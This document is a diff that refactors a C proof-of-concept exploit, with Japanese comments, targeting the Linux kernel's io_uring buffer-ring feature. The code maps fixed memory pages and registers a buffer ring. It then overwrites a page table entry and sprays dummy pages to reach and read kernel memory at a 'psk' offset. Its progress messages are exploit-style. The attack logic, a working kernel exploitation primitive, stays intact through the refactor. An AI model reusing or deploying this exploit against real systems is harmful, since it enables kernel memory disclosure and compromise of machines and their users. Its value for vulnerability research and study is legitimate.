@@ -8,9 +8,6 @@
 #include <liburing.h>
 #include <stdlib.h>
 
-/** page size */
-#define PAGE_SIZE sysconf(_SC_PAGE_SIZE)
-
 /* dummy page */
 const int DUMMY_PAGE = 199;
 
@@ -23,51 +20,17 @@ const int OFFSET = 0x5000;
 // psk のページ内オフセット
 const int PAGE_IN_OFFSET = 0x1f6;
 
+void *mmap_fixed(void *addr);
+
 int main() {
     // 領域を3つ確保
-    void *new_map_1 = mmap(
-        (void *)0xdead000000,
-        0x1000,
-        PROT_READ | PROT_WRITE,
-        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
-        -1,
-        0
-    );
-    if (new_map_1 == MAP_FAILED) {
-        perror("[-] mmap() failed");
-        exit(1);
-    }
-
-    void *new_map_2 = mmap(
-        (void *)0xdead200000,
-        0x1000,
-        PROT_READ | PROT_WRITE,
-        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
-        -1,
-        0
-    );
-    if (new_map_2 == MAP_FAILED) {
-        perror("[-] mmap() failed");
-        exit(1);
-    }
-
-    void *new_map_3 = mmap(
-        (void *)0xdead201000,
-        0x1000,
-        PROT_READ | PROT_WRITE,
-        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
-        -1,
-        0
-    );
-    if (new_map_3 == MAP_FAILED) {
-        perror("[-] mmap() failed");
-        exit(1);
-    }
+    void *new_map_1 = mmap_fixed((void *)0xdead000000);
+    void *new_map_2 = mmap_fixed((void *)0xdead200000);
+    void *new_map_3 = mmap_fixed((void *)0xdead201000);
 
     // io_uring の初期化
     struct io_uring ring;
     io_uring_queue_init(40, &ring, 0);
-    printf("[+] uring_fd = %d\n", ring.ring_fd);
 
     // register buffer ring
     struct io_uring_buf_reg reg = {
@@ -115,9 +78,6 @@ int main() {
 
     // PTE 書き換え
     *(uint64_t *)pbuf_map = *((uint64_t *)pbuf_map + 1);
-
-    // ページ解放
-    if (munmap(pbuf_map, 0x1000) == -1) perror("[-] munmap() failed");
 
     // ダミーページ確保
     address dummy_pages[DUMMY_PAGE];
@@ -184,13 +144,26 @@ int main() {
             printf("[+] %lx\n", *(uint64_t *)(psk_addr + i * 0x8));
         }
     } else {
-        printf("[-] failed lead to the target page\n");
-        if (munmap(new_map_2, 0x1000) == -1) perror("munmap() failed");
+        printf("[-] failed to lead to the target page\n");
     }
 
-    // メモリの解放関連
-    if (munmap(new_map_1, 0x1000) == -1) perror("munmap() failed");
-    io_uring_queue_exit(&ring);
+    if (munmap(new_map_1, 0x1000) == -1) perror("[-] munmap() failed");
 
     return 0;
+}
+
+void *mmap_fixed(void *addr) {
+    void *new_mem = mmap(
+        addr,
+        0x1000,
+        PROT_READ | PROT_WRITE,
+        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
+        -1,
+        0
+    );
+    if (new_mem == MAP_FAILED) {
+        perror("[-] mmap() failed");
+        exit(1);
+    }
+    return new_mem;
 }
